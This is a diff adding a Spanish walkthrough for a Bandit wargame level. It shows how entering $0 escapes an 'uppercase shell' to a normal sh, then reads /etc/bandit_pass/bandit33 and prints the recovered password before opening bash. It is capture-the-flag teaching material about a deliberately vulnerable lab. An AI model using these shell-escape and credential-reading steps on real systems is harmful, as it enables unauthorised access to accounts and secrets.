@@ -1,0 +1,64 @@
+# Para salir de esta shell "modificada, es necesario comprender su 
+# funcionamiento.
+# La consola transforma todas las letras [a-zA-Z] a mayusculas. Ejemplo:
+WELCOME TO THE UPPERCASE SHELL
+>> 
+>> echo hola
+sh: 1: ECHO: not found
+>> man
+sh: 1: MAN: not found
+>> help
+sh: 1: HELP: not found
+
+# Pero los caracteres especiales y numeros permanecen intactos y se procesan
+>> /
+sh: 1: /: Permission denied
+>> 2
+sh: 1: 2: not found
+>> _
+sh: 1: _: not found
+>> .
+>> .
+
+# Tambien se observa que con caracteres especiales se puede acceder a 
+# los diferentes directorios y archivos
+>> *
+sh: 1: uppershell: not found
+>> /*
+sh: 1: /bin: Permission denied
+>> .*
+sh: 1: .: ..: not found
+>> ../*
+sh: 1: ../bandit0: Permission denied
+>> ./*
+
+# Tras investigar el manual de "sh", me percato del uso de los 
+# argumentos, y de que "$0" suele contener el programa en ejecución, 
+# por lo que procedo a intentar inyectarlo en el terminal.
+>> $0
+$ 
+$ 
+$ id
+uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)
+$ ls
+uppershell
+$ whoami
+bandit33
+
+# Obtenemos la contraseña
+$ cat /etc/bandit_pass/bandit33
+odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
+
+# Tras inyectarlo, se observa que hemos conseguido inyectar el 
+# lanzamiento de una shell, ya que la ejecución de uppershell se lanza 
+# mediante sh. Esto se puede comprobar si lanzamos uppershell y 
+# ejecutamos un comando como:
+$ ./uppershell       
+WELCOME TO THE UPPERCASE SHELL
+>> ..$0
+sh: 1: ..sh: not found
+
+# Si queremos obtener un acceso más "interactivo", se puede lanzar una 
+# shell bash:
+$ /bin/bash
+bandit33@bandit:~$
